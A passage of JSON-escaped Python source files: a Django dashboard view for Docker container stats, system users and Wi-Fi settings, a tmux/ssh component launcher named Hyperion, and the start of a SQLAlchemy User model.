cursor.fetchall()\\n                    datasets_perc.append(counter_val)\\n                # values w/o % appended to them\\n                for iter in range(2,4):\\n                    cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1])\\n                    counter_val = cursor.fetchall()\\n                    datasets_mem.append(counter_val)\\n                # values w/o % appended to them\\n                for iter in range(4,8):\\n                    cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1])\\n                    counter_val = cursor.fetchall()\\n                    datasets_io.append(counter_val)\\n                data = {'container_id': row[0], 'container_name' : row[1], 'data_io': datasets_io, 'data_mem': datasets_mem, 'data_perc': datasets_perc}\\n                finalset.append(data)\\n            return JsonResponse(finalset, safe=False)\\n        elif action == 'getThreads':\\n            print(action)\\n            rows = []\\n            ps = subprocess.Popen(['top', '-b','-n','1'], stdout=subprocess.PIPE).communicate()[0]\\n            processes = ps.decode().split('\\\\n')\\n            # this specifies the number of splits, so the splitted lines\\n            # will have (nfields+1) elements\\n            nfields = len(processes[0].split()) - 1\\n            for row in processes[4:]:\\n                rows.append(row.split(None, nfields))\\n            return JsonResponse(rows, safe=False)\\n        elif action == 'getContainerTop':\\n            print(action)\\n            con = sqlite3.connect(\\\"dashboard.sqlite3\\\")\\n            cursor = con.cursor()\\n            cursor.execute(common.Q_GET_CONTAINER_ID)\\n            rows = cursor.fetchall()\\n            resultset = []\\n            for i in rows:\\n                data = {}\\n                datasets = []\\n                ps = subprocess.Popen(['docker', 'top',i[0]], stdout=subprocess.PIPE).communicate()[0]\\n                processes = ps.decode().split('\\\\n')\\n                # this specifies the number of splits, so the splitted lines\\n                # will have (nfields+1) elements\\n                nfields = len(processes[0].split()) - 1\\n                for p in processes[1:]:\\n                    datasets.append(p.split(None, nfields))\\n                data = {'container_id': i[0], 'container_name' : i[1], 'data': datasets}\\n                resultset.append(data)\\n            return JsonResponse(resultset, safe=False)\\n        elif action == 'getSettings':\\n            print(action)\\n            ps = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\\\n')[0]\\n            # sample ps \\n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\\n            userlist = ps.split(':')[3].split(',')\\n            configuredwifi = get_allconfiguredwifi()\\n            wifi_aps = get_allAPs()\\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps}], safe=False)\\n        elif action == 'deleteUser':\\n            print(action)\\n            username = escape(request.POST.get(\\\"user\\\"))\\n            ps = subprocess.Popen(['userdel', username], stdout=subprocess.PIPE).communicate()\\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\\\n')[0]\\n            # sample ps \\n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\\n            userlist = fetchusers.split(':')[3].split(',')\\n            configuredwifi = get_allconfiguredwifi()\\n            wifi_aps = get_allAPs()\\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deleteuser', 'endpoint': username}], safe=False)\\n        elif action == 'addNewUser':\\n            print(action)\\n            username = escape(request.POST.get(\\\"username\\\"))\\n            password = escape(request.POST.get(\\\"password\\\"))\\n            add_user(username,password)\\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\\\n')[0]\\n            # sample ps \\n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\\n            userlist = fetchusers.split(':')[3].split(',')\\n            configuredwifi = get_allconfiguredwifi()\\n            wifi_aps = get_allAPs()\\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'adduser', 'endpoint': username}], safe=False)\\n        elif action == 'addWifi':\\n            print(action)\\n            # connect to wifi ap user selected\\n            wifi_pass = escape(request.POST.get(\\\"wifi_password\\\"))\\n            wifi_name = request.POST.get(\\\"wifi_ap\\\")\\n            if len(wifi_name) > 0:\\n                add_newWifiConn(wifi_name,wifi_pass)\\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\\\n')[0]\\n            # sample ps \\n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\\n            userlist = fetchusers.split(':')[3].split(',')\\n            configuredwifi = get_allconfiguredwifi()\\n            wifi_aps = get_allAPs()\\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'addwifi', 'endpoint': wifi_name}], safe=False)\\n        elif action == 'deleteWifi':\\n            print(action)\\n            # connect to wifi ap user selected\\n            wifi_name = request.POST.get(\\\"wifi\\\")\\n            delete_WifiConn(wifi_name)\\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\\\n')[0]\\n            # sample ps \\n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\\n            userlist = fetchusers.split(':')[3].split(',')\\n            configuredwifi = get_allconfiguredwifi()\\n            wifi_aps = get_allAPs()\\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deletewifi', 'endpoint': wifi_name}], safe=False)\\n        elif action == 'editWifi':\\n            print(action)\\n            # connect to wifi ap user selected\\n            wifi_name = request.POST.get(\\\"wifi_ap\\\")\\n            wifi_pass = escape(request.POST.get(\\\"wifi_password\\\"))\\n            edit_WifiConn(wifi_name,wifi_pass)\\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\\\n')[0]\\n            # sample ps \\n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\\n            userlist = fetchusers.split(':')[3].split(',')\\n            configuredwifi = get_allconfiguredwifi()\\n            wifi_aps = get_allAPs()\\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'editwifi', 'endpoint': wifi_name}], safe=False)\\n        return JsonResponse(serializer.errors, status=400)\\n\\ndef index(request):\\n    return render(request, 'index.html')\\n\\nclass BoxDetailsViewSet(viewsets.ModelViewSet):\\n    queryset = BoxDetails.objects.all()\\n    serializer_class = BoxDetailsSerializer\\n\\nclass RegisteredServicesViewSet(viewsets.ModelViewSet):\\n    queryset = RegisteredServices.objects.all()\\n    serializer_class = RegisteredServicesSerializer    \\n\\n\\n\",\n          \"#! /usr/bin/env python\\nfrom libtmux import Server\\nfrom yaml import load, dump\\nfrom setupParser import Loader\\nfrom DepTree import Node, dep_resolve, CircularReferenceException\\nimport logging\\nimport os\\nimport socket\\nimport argparse\\nfrom psutil import Process\\nfrom subprocess import call\\nfrom graphviz import Digraph\\nfrom enum import Enum\\nfrom time import sleep\\n\\nimport sys\\nfrom PyQt4 import QtGui\\nimport hyperGUI\\n\\nFORMAT = \\\"%(asctime)s: %(name)s [%(levelname)s]:\\\\t%(message)s\\\"\\n\\nlogging.basicConfig(level=logging.WARNING, format=FORMAT, datefmt='%I:%M:%S')\\nTMP_SLAVE_DIR = \\\"/tmp/Hyperion/slave/components\\\"\\nTMP_COMP_DIR = \\\"/tmp/Hyperion/components\\\"\\nTMP_LOG_PATH = \\\"/tmp/Hyperion/log\\\"\\n\\nBASE_DIR = os.path.dirname(__file__)\\nSCRIPT_CLONE_PATH = (\\\"%s/scripts/start_named_clone_session.sh\\\" % BASE_DIR)\\n\\n\\nclass CheckState(Enum):\\n    RUNNING = 0\\n    STOPPED = 1\\n    STOPPED_BUT_SUCCESSFUL = 2\\n    STARTED_BY_HAND = 3\\n    DEP_FAILED = 4\\n\\n\\nclass ControlCenter:\\n\\n    def __init__(self, configfile=None):\\n        self.logger = logging.getLogger(__name__)\\n        self.logger.setLevel(logging.DEBUG)\\n        self.configfile = configfile\\n        self.nodes = {}\\n        self.server = []\\n        self.host_list = []\\n\\n        if configfile:\\n            self.load_config(configfile)\\n            self.session_name = self.config[\\\"name\\\"]\\n\\n            # Debug write resulting yaml file\\n            with open('debug-result.yml', 'w') as outfile:\\n                dump(self.config, outfile, default_flow_style=False)\\n            self.logger.debug(\\\"Loading config was successful\\\")\\n\\n            self.server = Server()\\n\\n            if self.server.has_session(self.session_name):\\n                self.session = self.server.find_where({\\n                    \\\"session_name\\\": self.session_name\\n                })\\n\\n                self.logger.info('found running session by name \\\"%s\\\" on server' % self.session_name)\\n            else:\\n                self.logger.info('starting new session by name \\\"%s\\\" on server' % self.session_name)\\n                self.session = self.server.new_session(\\n                    session_name=self.session_name,\\n                    window_name=\\\"Main\\\"\\n                )\\n        else:\\n            self.config = None\\n\\n    ###################\\n    # Setup\\n    ###################\\n    def load_config(self, filename=\\\"default.yaml\\\"):\\n        with open(filename) as data_file:\\n            self.config = load(data_file, Loader)\\n\\n    def init(self):\\n        if not self.config:\\n            self.logger.error(\\\" Config not loaded yet!\\\")\\n\\n        else:\\n            for group in self.config['groups']:\\n                for comp in group['components']:\\n                    self.logger.debug(\\\"Checking component '%s' in group '%s' on host '%s'\\\" %\\n                                      (comp['name'], group['name'], comp['host']))\\n\\n                    if comp['host'] != \\\"localhost\\\" and not self.run_on_localhost(comp):\\n                        self.copy_component_to_remote(comp, comp['name'], comp['host'])\\n\\n            # Remove duplicate hosts\\n            self.host_list = list(set(self.host_list))\\n\\n            self.set_dependencies(True)\\n\\n    def set_dependencies(self, exit_on_fail):\\n        for group in self.config['groups']:\\n            for comp in group['components']:\\n                self.nodes[comp['name']] = Node(comp)\\n\\n        # Add a pseudo node that depends on all other nodes, to get a starting point to be able to iterate through all\\n        # nodes with simple algorithms\\n        master_node = Node({'name': 'master_node'})\\n        for name in self.nodes:\\n            node = self.nodes.get(name)\\n\\n            # Add edges from each node to pseudo node\\n            master_node.addEdge(node)\\n\\n            # Add edges based on dependencies specified in the configuration\\n            if \\\"depends\\\" in node.component:\\n                for dep in node.component['depends']:\\n                    if dep in self.nodes:\\n                        node.addEdge(self.nodes[dep])\\n                    else:\\n                        self.logger.error(\\\"Unmet dependency: '%s' for component '%s'!\\\" % (dep, node.comp_name))\\n                        if exit_on_fail:\\n                            exit(1)\\n        self.nodes['master_node'] = master_node\\n\\n        # Test if starting all components is possible\\n        try:\\n            node = self.nodes.get('master_node')\\n            res = []\\n            unres = []\\n            dep_resolve(node, res, unres)\\n            dep_string = \\\"\\\"\\n            for node in res:\\n                if node is not master_node:\\n                    dep_string = \\\"%s -> %s\\\" % (dep_string, node.comp_name)\\n            self.logger.debug(\\\"Dependency tree for start all: %s\\\" % dep_string)\\n        except CircularReferenceException as ex:\\n            self.logger.error(\\\"Detected circular dependency reference between %s and %s!\\\" % (ex.node1, ex.node2))\\n            if exit_on_fail:\\n                exit(1)\\n\\n    def copy_component_to_remote(self, infile, comp, host):\\n        self.host_list.append(host)\\n\\n        self.logger.debug(\\\"Saving component to tmp\\\")\\n        tmp_comp_path = ('%s/%s.yaml' % (TMP_COMP_DIR, comp))\\n        ensure_dir(tmp_comp_path)\\n        with open(tmp_comp_path, 'w') as outfile:\\n            dump(infile, outfile, default_flow_style=False)\\n\\n        self.logger.debug('Copying component \\\"%s\\\" to remote host \\\"%s\\\"' % (comp, host))\\n        cmd = (\\\"ssh %s 'mkdir -p %s' & scp %s %s:%s/%s.yaml\\\" %\\n               (host, TMP_SLAVE_DIR, tmp_comp_path, host, TMP_SLAVE_DIR, comp))\\n        self.logger.debug(cmd)\\n        send_main_session_command(self.session, cmd)\\n\\n    ###################\\n    # Stop\\n    ###################\\n    def stop_component(self, comp):\\n        if comp['host'] != 'localhost' and not self.run_on_localhost(comp):\\n            self.logger.debug(\\\"Stopping remote component '%s' on host '%s'\\\" % (comp['name'], comp['host']))\\n            self.stop_remote_component(comp['name'], comp['host'])\\n        else:\\n            window = find_window(self.session, comp['name'])\\n\\n            if window:\\n                self.logger.debug(\\\"window '%s' found running\\\" % comp['name'])\\n                self.logger.info(\\\"Shutting down window...\\\")\\n                kill_window(window)\\n                self.logger.info(\\\"... done!\\\")\\n\\n    def stop_remote_component(self, comp_name, host):\\n        # invoke Hyperion in slave mode on each remote host\\n        cmd = (\\\"ssh %s 'hyperion --config %s/%s.yaml slave --kill'\\\" % (host, TMP_SLAVE_DIR, comp_name))\\n        self.logger.debug(\\\"Run cmd:\\\\n%s\\\" % cmd)\\n        send_main_session_command(self.session, cmd)\\n\\n    ###################\\n    # Start\\n    ###################\\n    def start_component(self, comp):\\n\\n        node = self.nodes.get(comp['name'])\\n        res = []\\n        unres = []\\n        dep_resolve(node, res, unres)\\n        for node in res:\\n            self.logger.debug(\\\"node name '%s' vs. comp name '%s'\\\" % (node.comp_name, comp['name']))\\n            if node.comp_name != comp['name']:\\n                self.logger.debug(\\\"Checking and starting %s\\\" % node.comp_name)\\n                state = self.check_component(node.component)\\n                if (state is CheckState.STOPPED_BUT_SUCCESSFUL or\\n                        state is CheckState.STARTED_BY_HAND or\\n                        state is CheckState.RUNNING):\\n                    self.logger.debug(\\\"Component %s is already running, skipping to next in line\\\" % comp['name'])\\n                else:\\n                    self.logger.debug(\\\"Start component '%s' as dependency of '%s'\\\" % (node.comp_name, comp['name']))\\n                    self.start_component_without_deps(node.component)\\n\\n                    tries = 0\\n                    while True:\\n                        self.logger.debug(\\\"Checking %s resulted in checkstate %s\\\" % (node.comp_name, state))\\n                        state = self.check_component(node.component)\\n                        if (state is not CheckState.RUNNING or\\n                           state is not CheckState.STOPPED_BUT_SUCCESSFUL):\\n                            break\\n                        if tries > 100:\\n                            return False\\n                        tries = tries + 1\\n                        sleep(.5)\\n\\n        self.logger.debug(\\\"All dependencies satisfied, starting '%s'\\\" % (comp['name']))\\n        state = self.check_component(node.component)\\n        if (state is CheckState.STARTED_BY_HAND or\\n                state is CheckState.RUNNING):\\n            self.logger.debug(\\\"Component %s is already running. Skipping start\\\" % comp['name'])\\n        else:\\n            self.start_component_without_deps(comp)\\n        return True\\n\\n    def start_component_without_deps(self, comp):\\n        if comp['host'] != 'localhost' and not self.run_on_localhost(comp):\\n            self.logger.debug(\\\"Starting remote component '%s' on host '%s'\\\" % (comp['name'], comp['host']))\\n            self.start_remote_component(comp['name'], comp['host'])\\n        else:\\n            log_file = (\\\"%s/%s\\\" % (TMP_LOG_PATH, comp['name']))\\n            window = find_window(self.session, comp['name'])\\n\\n            if window:\\n                self.logger.debug(\\\"Restarting '%s' in old window\\\" % comp['name'])\\n                start_window(window, comp['cmd'][0]['start'], log_file, comp['name'])\\n            else:\\n                self.logger.info(\\\"creating window '%s'\\\" % comp['name'])\\n                window = self.session.new_window(comp['name'])\\n                start_window(window, comp['cmd'][0]['start'], log_file, comp['name'])\\n\\n    def start_remote_component(self, comp_name, host):\\n        # invoke Hyperion in slave mode on each remote host\\n        cmd = (\\\"ssh %s 'hyperion --config %s/%s.yaml slave'\\\" % (host, TMP_SLAVE_DIR, comp_name))\\n        self.logger.debug(\\\"Run cmd:\\\\n%s\\\" % cmd)\\n        send_main_session_command(self.session, cmd)\\n\\n    ###################\\n    # Check\\n    ###################\\n    def check_component(self, comp):\\n        return check_component(comp, self.session, self.logger)\\n\\n    ###################\\n    # Dependency management\\n    ###################\\n    def get_dep_list(self, comp):\\n        node = self.nodes.get(comp['name'])\\n        res = []\\n        unres = []\\n        dep_resolve(node, res, unres)\\n        res.remove(node)\\n\\n        return res\\n\\n    ###################\\n    # Host related checks\\n    ###################\\n    def is_localhost(self, hostname):\\n        try:\\n            hn_out = socket.gethostbyname(hostname)\\n            if hn_out == '127.0.0.1' or hn_out == '::1':\\n                self.logger.debug(\\\"Host '%s' is localhost\\\" % hostname)\\n                return True\\n            else:\\n                self.logger.debug(\\\"Host '%s' is not localhost\\\" % hostname)\\n                return False\\n        except socket.gaierror:\\n            sys.exit(\\\"Host '%s' is unknown! Update your /etc/hosts file!\\\" % hostname)\\n\\n    def run_on_localhost(self, comp):\\n        return self.is_localhost(comp['host'])\\n\\n    ###################\\n    # TMUX\\n    ###################\\n    def kill_remote_session_by_name(self, name, host):\\n        cmd = \\\"ssh -t %s 'tmux kill-session -t %s'\\\" % (host, name)\\n        send_main_session_command(self.session, cmd)\\n\\n    def start_clone_session(self, comp_name, session_name):\\n        cmd = \\\"%s '%s' '%s'\\\" % (SCRIPT_CLONE_PATH, session_name, comp_name)\\n        send_main_session_command(self.session, cmd)\\n\\n    def start_remote_clone_session(self, comp_name, session_name, hostname):\\n        remote_cmd = (\\\"%s '%s' '%s'\\\" % (SCRIPT_CLONE_PATH, session_name, comp_name))\\n        cmd = \\\"ssh %s 'bash -s' < %s\\\" % (hostname, remote_cmd)\\n        send_main_session_command(self.session, cmd)\\n\\n    ###################\\n    # Visualisation\\n    ###################\\n    def draw_graph(self):\\n        deps = Digraph(\\\"Deps\\\", strict=True)\\n        deps.graph_attr.update(rankdir=\\\"BT\\\")\\n        try:\\n            node = self.nodes.get('master_node')\\n\\n            for current in node.depends_on:\\n                deps.node(current.comp_name)\\n\\n                res = []\\n                unres = []\\n                dep_resolve(current, res, unres)\\n                for node in res:\\n                    if \\\"depends\\\" in node.component:\\n                        for dep in node.component['depends']:\\n                            if dep not in self.nodes:\\n                                deps.node(dep, color=\\\"red\\\")\\n                                deps.edge(node.comp_name, dep, \\\"missing\\\", color=\\\"red\\\")\\n                            elif node.comp_name is not \\\"master_node\\\":\\n                                deps.edge(node.comp_name, dep)\\n\\n        except CircularReferenceException as ex:\\n            self.logger.error(\\\"Detected circular dependency reference between %s and %s!\\\" % (ex.node1, ex.node2))\\n            deps.edge(ex.node1, ex.node2, \\\"circular error\\\", color=\\\"red\\\")\\n            deps.edge(ex.node2, ex.node1, color=\\\"red\\\")\\n\\n        deps.view()\\n\\n\\nclass SlaveLauncher:\\n\\n    def __init__(self, configfile=None, kill_mode=False, check_mode=False):\\n        self.kill_mode = kill_mode\\n        self.check_mode = check_mode\\n        self.logger = logging.getLogger(__name__)\\n        self.logger.setLevel(logging.DEBUG)\\n        self.config = None\\n        self.session = None\\n        if kill_mode:\\n            self.logger.info(\\\"started slave with kill mode\\\")\\n        if check_mode:\\n            self.logger.info(\\\"started slave with check mode\\\")\\n        self.server = Server()\\n\\n        if self.server.has_session(\\\"slave-session\\\"):\\n            self.session = self.server.find_where({\\n                \\\"session_name\\\": \\\"slave-session\\\"\\n            })\\n\\n            self.logger.info('found running slave session on server')\\n        elif not kill_mode and not check_mode:\\n            self.logger.info('starting new slave session on server')\\n            self.session = self.server.new_session(\\n                session_name=\\\"slave-session\\\"\\n            )\\n\\n        else:\\n            self.logger.info(\\\"No slave session found on server. Aborting\\\")\\n            exit(CheckState.STOPPED)\\n\\n        if configfile:\\n            self.load_config(configfile)\\n            self.window_name = self.config['name']\\n            self.flag_path = (\\\"/tmp/Hyperion/slaves/%s\\\" % self.window_name)\\n            self.log_file = (\\\"/tmp/Hyperion/log/%s\\\" % self.window_name)\\n            ensure_dir(self.log_file)\\n        else:\\n            self.logger.error(\\\"No slave component config provided\\\")\\n\\n    def load_config(self, filename=\\\"default.yaml\\\"):\\n        with open(filename) as data_file:\\n            self.config = load(data_file, Loader)\\n\\n    def init(self):\\n        if not self.config:\\n            self.logger.error(\\\" Config not loaded yet!\\\")\\n        elif not self.session:\\n            self.logger.error(\\\" Init aborted. No session was found!\\\")\\n        else:\\n            self.logger.debug(self.config)\\n            window = find_window(self.session, self.window_name)\\n\\n            if window:\\n                self.logger.debug(\\\"window '%s' found running\\\" % self.window_name)\\n                if self.kill_mode:\\n                    self.logger.info(\\\"Shutting down window...\\\")\\n                    kill_window(window)\\n                    self.logger.info(\\\"... done!\\\")\\n            elif not self.kill_mode:\\n                self.logger.info(\\\"creating window '%s'\\\" % self.window_name)\\n                window = self.session.new_window(self.window_name)\\n                start_window(window, self.config['cmd'][0]['start'], self.log_file, self.window_name)\\n\\n            else:\\n                self.logger.info(\\\"There is no component running by the name '%s'. Exiting kill mode\\\" %\\n                                 self.window_name)\\n\\n    def run_check(self):\\n        if not self.config:\\n            self.logger.error(\\\" Config not loaded yet!\\\")\\n            exit(CheckState.STOPPED.value)\\n        elif not self.session:\\n            self.logger.error(\\\" Init aborted. No session was found!\\\")\\n            exit(CheckState.STOPPED.value)\\n\\n        check_state = check_component(self.config, self.session, self.logger)\\n        exit(check_state.value)\\n\\n###################\\n# Component Management\\n###################\\ndef run_component_check(comp):\\n    if call(comp['cmd'][1]['check'], shell=True) == 0:\\n        return True\\n    else:\\n        return False\\n\\n\\ndef check_component(comp, session, logger):\\n    logger.debug(\\\"Running component check for %s\\\" % comp['name'])\\n    check_available = len(comp['cmd']) > 1 and 'check' in comp['cmd'][1]\\n    window = find_window(session, comp['name'])\\n    if window:\\n        pid = get_window_pid(window)\\n        logger.debug(\\\"Found window pid: %s\\\" % pid)\\n\\n        # May return more child pids if logging is done via tee (which then was started twice in the window too)\\n        procs = []\\n        for entry in pid:\\n            procs.extend(Process(entry).children(recursive=True))\\n        pids = [p.pid for p in procs]\\n        logger.debug(\\\"Window is running %s child processes\\\" % len(pids))\\n\\n        # Two processes are tee logging\\n        # TODO: Change this when more logging options are introduced\\n        if len(pids) < 3:\\n            logger.debug(\\\"Main window process has finished. Running custom check if available\\\")\\n            if check_available and run_component_check(comp):\\n                logger.debug(\\\"Process terminated but check was successful\\\")\\n                return CheckState.STOPPED_BUT_SUCCESSFUL\\n            else:\\n                logger.debug(\\\"Check failed or no check available: returning false\\\")\\n                return CheckState.STOPPED\\n        elif check_available and run_component_check(comp):\\n            logger.debug(\\\"Check succeeded\\\")\\n            return CheckState.RUNNING\\n        elif not check_available:\\n            logger.debug(\\\"No custom check specified and got sufficient pid amount: returning true\\\")\\n            return CheckState.RUNNING\\n        else:\\n            logger.debug(\\\"Check failed: returning false\\\")\\n            return CheckState.STOPPED\\n    else:\\n        logger.debug(\\\"%s window is not running. Running custom check\\\" % comp['name'])\\n        if check_available and run_component_check(comp):\\n            logger.debug(\\\"Component was not started by Hyperion, but the check succeeded\\\")\\n            return CheckState.STARTED_BY_HAND\\n        else:\\n            logger.debug(\\\"Window not running and no check command is available or it failed: returning false\\\")\\n            return CheckState.STOPPED\\n\\n\\ndef get_window_pid(window):\\n    r = window.cmd('list-panes',\\n                   \\\"-F #{pane_pid}\\\")\\n    return [int(p) for p in r.stdout]\\n\\n###################\\n# TMUX\\n###################\\ndef kill_session_by_name(server, name):\\n    session = server.find_where({\\n        \\\"session_name\\\": name\\n    })\\n    session.kill_session()\\n\\n\\ndef kill_window(window):\\n    window.cmd(\\\"send-keys\\\", \\\"\\\", \\\"C-c\\\")\\n    window.kill_window()\\n\\n\\ndef start_window(window, cmd, log_file, comp_name):\\n    setup_log(window, log_file, comp_name)\\n    window.cmd(\\\"send-keys\\\", cmd, \\\"Enter\\\")\\n\\n\\ndef find_window(session, window_name):\\n    window = session.find_where({\\n        \\\"window_name\\\": window_name\\n    })\\n    return window\\n\\n\\ndef send_main_session_command(session, cmd):\\n    window = find_window(session, \\\"Main\\\")\\n    window.cmd(\\\"send-keys\\\", cmd, \\\"Enter\\\")\\n\\n\\n###################\\n# Logging\\n###################\\ndef setup_log(window, file, comp_name):\\n    clear_log(file)\\n    # Reroute stderr to log file\\n    window.cmd(\\\"send-keys\\\", \\\"exec 2> >(exec tee -i -a '%s')\\\" % file, \\\"Enter\\\")\\n    # Reroute stdin to log file\\n    window.cmd(\\\"send-keys\\\", \\\"exec 1> >(exec tee -i -a '%s')\\\" % file, \\\"Enter\\\")\\n    window.cmd(\\\"send-keys\\\", ('echo \\\"#Hyperion component start: %s\\\\n$(date)\\\"' % comp_name), \\\"Enter\\\")\\n\\n\\ndef clear_log(file_path):\\n    if os.path.isfile(file_path):\\n        os.remove(file_path)\\n\\n\\ndef ensure_dir(file_path):\\n    directory = os.path.dirname(file_path)\\n    if not os.path.exists(directory):\\n        os.makedirs(directory)\\n\\n###################\\n# Startup\\n###################\\ndef main():\\n    logger = logging.getLogger(__name__)\\n    logger.setLevel(logging.DEBUG)\\n    parser = argparse.ArgumentParser()\\n\\n    # Create top level parser\\n    parser.add_argument(\\\"--config\\\", '-c', type=str,\\n                        default='test.yaml',\\n                        help=\\\"YAML config file. see sample-config.yaml. Default: test.yaml\\\")\\n    subparsers = parser.add_subparsers(dest=\\\"cmd\\\")\\n\\n    # Create parser for the editor command\\n    subparser_editor = subparsers.add_parser('edit', help=\\\"Launches the editor to edit or create new systems and \\\"\\n                                                          \\\"components\\\")\\n    # Create parser for the run command\\n    subparser_run = subparsers.add_parser('run', help=\\\"Launches the setup specified by the --config argument\\\")\\n    # Create parser for validator\\n    subparser_val = subparsers.add_parser('validate', help=\\\"Validate the setup specified by the --config argument\\\")\\n\\n    subparser_remote = subparsers.add_parser('slave', help=\\\"Run a component locally without controlling it. The \\\"\\n                                                           \\\"control is taken care of the remote master invoking \\\"\\n                                                           \\\"this command.\\\\nIf run with the --kill flag, the \\\"\\n                                                           \\\"passed component will be killed\\\")\\n\\n    subparser_val.add_argument(\\\"--visual\\\", help=\\\"Generate and show a graph image\\\", action=\\\"store_true\\\")\\n\\n    remote_mutex = subparser_remote.add_mutually_exclusive_group(required=False)\\n\\n    remote_mutex.add_argument('-k', '--kill', help=\\\"switch to kill mode\\\", action=\\\"store_true\\\")\\n    remote_mutex.add_argument('-c', '--check', help=\\\"Run a component check\\\", action=\\\"store_true\\\")\\n\\n    args = parser.parse_args()\\n    logger.debug(args)\\n\\n    if args.cmd == 'edit':\\n        logger.debug(\\\"Launching editor mode\\\")\\n\\n    elif args.cmd == 'run':\\n        logger.debug(\\\"Launching runner mode\\\")\\n\\n        cc = ControlCenter(args.config)\\n        cc.init()\\n        start_gui(cc)\\n\\n    elif args.cmd == 'validate':\\n        logger.debug(\\\"Launching validation mode\\\")\\n        cc = ControlCenter(args.config)\\n        if args.visual:\\n            cc.set_dependencies(False)\\n            cc.draw_graph()\\n        else:\\n            cc.set_dependencies(True)\\n\\n    elif args.cmd == 'slave':\\n        logger.debug(\\\"Launching slave mode\\\")\\n        sl = SlaveLauncher(args.config, args.kill, args.check)\\n\\n        if args.check:\\n            sl.run_check()\\n        else:\\n            sl.init()\\n\\n\\n###################\\n# GUI\\n###################\\ndef start_gui(control_center):\\n    app = QtGui.QApplication(sys.argv)\\n    main_window = QtGui.QMainWindow()\\n    ui = hyperGUI.UiMainWindow()\\n    ui.ui_init(main_window, control_center)\\n    main_window.show()\\n    sys.exit(app.exec_())\\n\",\n          \"import geojson\\nimport datetime\\nimport dateutil.parser\\nfrom server import db\\nfrom sqlalchemy import desc\\nfrom server.models.dtos.user_dto import UserDTO, UserMappedProjectsDTO, MappedProject, UserFilterDTO, Pagination, \\\\\\n    UserSearchQuery, UserSearchDTO, ProjectParticipantUser, ListedUser\\nfrom server.models.postgis.licenses import License, users_licenses_table\\nfrom server.models.postgis.project_info import ProjectInfo\\nfrom server.models.postgis.statuses import MappingLevel, ProjectStatus, UserRole\\nfrom server.models.postgis.utils import NotFound, timestamp\\n\\nclass User(db.Model):\\n    \\\"\\\"\\\" Describes the history associated with a task \\\"\\\"\\\"\\n    __tablename__ = \\\"users\\\"\\n\\n    id = db.Column(db.BigInteger, primary_key=True, index=True)\\n    validation_message = db.Column(db.Boolean, default=True, nullable=False)\\n    username = db.Column(db.String, unique=True)\\n    role = db.Column(db.Integer, default=0, nullable=False)\\n    mapping_level = db.Column(db.Integer, default=1, nullable=False)\\n    projects_mapped = db.Column(db.Integer, default=1, nullable=False)\\n    tasks_mapped = db.Column(db.Integer, default=0, nullable=False)\\n    tasks_validated = db.Column(db.Integer, default=0, nullable=False)\\n    tasks_invalidated = db.Column(db.Integer, default=0, nullable=False)\\n    projects_mapped = db.Column(db.ARRAY(db.Integer))\\n    email_address = db.Column(db.String)\\n    is_email_verified = db.Column(db.Boolean, default=False)\\n    is_expert = db.Column(db.Boolean, default=False)\\n    twitter_id = db.Column(db.String)\\n    facebook_id = db.Column(db.String)\\n    linkedin_id = db.Column(db.String)\\n    date_registered = db.Column(db.DateTime, default=timestamp)\\n    # Represents the date the user last had one of their tasks validated\\n    last_validation_date = db.Column(db.DateTime, default=timestamp)\\n\\n    # Relationships\\n    accepted_licenses = db.relationship(\\\"License\\\", secondary=users_licenses_table)\\n\\n    def create(self):\\n        \\\"\\\"\\\" Creates and saves the current model to the DB \\\"\\\"\\\"\\n        db.session.add(self)\\n        db.session.commit()\\n\\n    def save(self):\\n        db.session.commit()\\n\\n    def get_by_id(self, user_id: int):\\n        \\\"\\\"\\\" Return the user for the specified id, or None if not found \\\"\\\"\\\"\\n        return User.query.get(user_id)\\n\\n    def get_by_username(self, username: str):\\n        \\\"\\\"\\\" Return the user for the specified username, or None if not found \\\"\\\"\\\"\\n        return User.query.filter_by(username=username).one_or_none()\\n\\n    def update_username(self, username: str):\\n        \\\"\\\"\\\" Update the username \\\"\\\"\\\"\\n        self.username = username\\n        db.session.commit()\\n\\n    def update(self, user_dto: UserDTO):\\n        \\\"\\\"\\\" Update the user details \\\"\\\"\\\"\\n        self.email_address = user_dto.email_address.lower() if user_dto.email_address else None\\n        self.twitter_id = user_dto.twitter_id.lower() if user_dto.twitter_id else None\\n        self.facebook_id = user_dto.facebook_id.lower() if user_dto.facebook_id else None\\n        self.linkedin_id = user_dto.linkedin_id.lower() if user_dto.linkedin_id else None\\n        self.validation_message = user_dto.validation_message\\n        